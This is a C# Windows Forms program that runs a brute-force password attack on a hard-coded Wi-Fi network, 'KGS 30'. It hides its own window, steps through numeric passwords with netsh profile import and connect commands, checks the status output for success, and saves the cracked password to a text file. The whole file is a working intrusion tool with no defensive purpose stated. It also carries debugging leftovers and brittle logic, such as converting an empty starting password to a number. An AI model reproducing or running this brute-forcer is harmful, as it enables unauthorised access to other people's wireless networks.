using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SimpleWifi;
using System.Diagnostics;
using System.Xml.Linq;
using System.IO;


namespace WiFiConnection
{
    public partial class Form1 : Form
    {
        private static Wifi wifi;
        List<AccessPoint> aps;

        public Form1()
        {
            InitializeComponent();
            
        }

        string[] networks;
        string networkName;
        static string password = "";
        bool connection = false;

        Stopwatch clock1 = new Stopwatch();
        Stopwatch clock2 = new Stopwatch();
        Stopwatch clock3 = new Stopwatch();

        long time1;
        long time2;
        long time3;


        private void Form1_Load(object sender, EventArgs e)
        {
            password = (Convert.ToInt64(password) - 100).ToString();
            clock1.Start();
            Hide();
            networks = ShowNetworks();

            //networkName = networks[1];
            networkName = "KGS 30";


            while (connection != true)
            {
                
                bool networkIsDetected = false;
                while(networkIsDetected == false)
                {
                    networks = ShowNetworks();
                    for (int i = 0; i < networks.Length; i++)
                        if (networks[i] == "KGS 30")
                        {
                            networkIsDetected = true;
                            break;
                        }
                }
                password = (Convert.ToInt64(password) + 100).ToString();
                if (password == "5111343901")
                    MessageBox.Show(errorCounter.ToString());

                Connect();
                if (connection == true)
                    break;
                //Connect();

            }

            using (StreamWriter streamWriter = new StreamWriter("Password.txt"))
                streamWriter.Write(password);

            clock1.Stop();
            textBox1.Text = password + Environment.NewLine;
            textBox1.Text += (clock1.ElapsedMilliseconds / 1000).ToString() + Environment.NewLine;
            textBox1.Text += errorCounter.ToString();
        }

        //delegate del()
        //    {



        // buf[7]

        // Подключено: 
        // "    ‘®бв®п­ЁҐ:                     Џ®¤Є«озҐ­®"

        // Идёт проверка подлинности (или просто неудачно):
        // "    ‘®бв®п­ЁҐ:                     €¤Ґв Їа®ўҐаЄ  Ї®¤«Ё­­®бвЁ"


        //s = ShowStatus();
        //buf = s.Split(separators, StringSplitOptions.None);


        string[] separators = { "\r\n" };
        int answerLength = 0;
        int counter = 0;
        string status = null;

        void Connect()
        {

            DeleteProfile(); // 81

            WriteFile(); // 0


            
            ImportFile(); // 518

            //clock1.Start();
            ConnectNetwork(); // 110
            //clock1.Stop();
            //time1 = clock1.ElapsedMilliseconds;
            //clock1.Reset();

            answerLength = 0;
            counter = 0;
            //if (password == "5111343899")
            //    answerLength += 0;
            while (answerLength != 24)
            {
                status = ShowStatus();
                string[] buf = status.Split(separators, StringSplitOptions.None);
                answerLength = buf.Length;

                if (counter++ > 200)
                {
                    MessageBox.Show("Плохой сигнал");
                    Process.GetCurrentProcess().Kill();
                }

                if (answerLength == 24)
                {


                    for (int i = 0; i < 10; i++)
                    {
                        //clock1.Start();
                        status = ShowStatus();
                        //clock1.Stop();
                        //time1 = clock1.ElapsedMilliseconds;
                        //clock1.Reset();
                        buf = status.Split(separators, StringSplitOptions.None);

                        if (buf[7] == "    ‘®бв®п­ЁҐ:                     €¤Ґв Їа®ўҐаЄ  Ї®¤«Ё­­®бвЁ")   // Неудачно
                        {
                            if (password == "87654321")
                                errorCounter++;
                            connection = false;
                        }
                        else if (buf[7] == "    ‘®бв®п­ЁҐ:                     Џ®¤Є«озҐ­®")             // Успешно
                        {
                            connection = true;
                            break;
                        }
                    }
                }
            }
        }
        int errorCounter = 0;
        string ShowStatus()
        {
            return(Cmd.Write("netsh wlan show interface"));
        }

        void DeleteProfile()
        {
            Cmd.Write("netsh wlan delete profile " + "\"" + networkName + "\"");
        }

        string filePath;
        string fileName;

        
        void WriteFile()
        {

            filePath = Directory.GetCurrentDirectory() + "\\";
            fileName = "xml1.xml";
            XmlConstructor.WriteXmlFile(networkName, password, filePath, fileName);
        }

        void ImportFile()
        {
            Cmd.Write("netsh wlan add profile " + filePath + fileName);
        }

        void ConnectNetwork()
        {
            Cmd.Write("netsh wlan connect name=" + "\"" + networkName + "\"");
        }

        private string[] ShowNetworks()
        {
            string s = Cmd.Write("netsh wlan show networks");
            string[] separators = { "\r\n" };
            string[] buf = s.Split(separators, StringSplitOptions.None);


            int numberOfNetworks = (buf.Length - 5) / 5;
            string[] networks = new string[numberOfNetworks];

            for (int networkIndex = 0; networkIndex < numberOfNetworks; networkIndex++)
            {
                networks[networkIndex] = buf[4 + networkIndex * 5].Substring(buf[4 + networkIndex * 5].IndexOf(':')).Substring(2);
            }

            return networks;
        }



        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
        }
    }
}
